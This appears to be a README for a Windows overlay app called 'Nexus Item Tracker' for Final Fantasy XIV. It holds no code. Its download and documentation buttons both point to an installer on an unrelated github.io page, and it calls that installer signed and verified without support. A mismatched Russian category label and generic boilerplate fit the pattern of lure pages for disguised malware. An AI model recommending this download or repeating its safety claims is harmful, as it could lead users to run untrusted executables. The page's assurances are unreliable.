# Nexus Item Tracker – Final Fantasy XIV

**Author:** MidnightPilotPonder
**Platform:** Windows 10 / Windows 11 only
**Category:** Только игры

---

## 🎮 What Is It?

Nexus Item Tracker is a lightweight Windows desktop utility designed exclusively for **Final Fantasy XIV** players who want a smarter way to handle their ever‑growing inventory. The app watches your in‑game bags, categorises items, and presents an overlay that lets you locate, filter, and plan item usage without ever leaving the game screen.

---

## ✨ Key Features

| ✅ | Feature |
|---|---|
| **Live Sync** | Real‑time monitoring of your inventory while you play. |
| **Smart Categorisation** | Auto‑group items by type, rarity, and user‑defined tags. |
| **Search & Filter** | Instant text search, rarity sliders, and class‑specific filters. |
| **Custom Overlays** | Transparent UI that can be docked, resized, or hidden with a hotkey. |
| **Export / Import** | Save your layout and item‑sets for future sessions or share with friends. |
| **Performance‑First** | Runs under 30 MB RAM, negligible CPU impact. |
| **Windows‑Only** | Optimised for the DirectX‑12 pipeline on Windows 10/11. |

---

## 📥 Get Started

<a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download Nexus Item Tracker"></a>

<a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Documentation-Read%20Now-green?style=for-the-badge&logo=markdown" alt="Documentation"></a>

*Both buttons lead to the official Release page where you can download the installer and read the full user guide.*

---

## 🛠️ Installation (Windows 10/11)

1. Click the **Download** button above.
2. Run the installer (it will request standard Windows permissions).
3. Follow the on‑screen wizard – default options work for most users.
4. Launch **Nexus Item Tracker** from the Start menu.
5. Press **F12** (default) while in‑game to toggle the overlay.

*The installer is signed and verified for Windows 10/11 compatibility.*

---

## 📚 Quick‑Start Guide

| Step | Action |
|------|--------|
| **1** | Open FF14 and log in. |
| **2** | Launch Nexus Item Tracker. |
| **3** | Press **F12** to display the overlay. |
| **4** | Use the search bar to locate any item instantly. |
| **5** | Right‑click an item to add a custom tag or move it to a saved collection. |
| **6** | Adjust overlay opacity in **Settings → Appearance**. |
| **7** | Save your layout before exiting to keep everything ready for next session. |

---

## 🐞 Troubleshooting

| Issue | Solution |
|-------|----------|
| Overlay doesn’t appear | Ensure the game is running in **Windowed** or **Borderless** mode; enable “Allow overlay” in Windows Settings → Privacy → Background apps. |
| High CPU usage | Disable **Auto‑Refresh** or increase the interval in Settings. |
| Missing items after a patch | Click **Refresh** in the overlay or restart the tracker. |

If problems persist, open an **Issue** on GitHub with a screenshot and a brief description.

---

## 🤝 Contributing

We welcome contributions from the FF14 community!

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑feature`).
3. Commit your changes with clear messages.
4. Open a Pull Request describing the improvement.

Please keep the scope Windows‑only and avoid adding external binaries.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📢 Stay Connected

- **Discord:** `NexusTracker#4321` – for real‑time support and feature requests.
- **Twitter:** [@MidnightPilotPonder](https://twitter.com/MidnightPilotPonder) – release announcements.

Happy hunting, Warrior of Light! 🚀

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```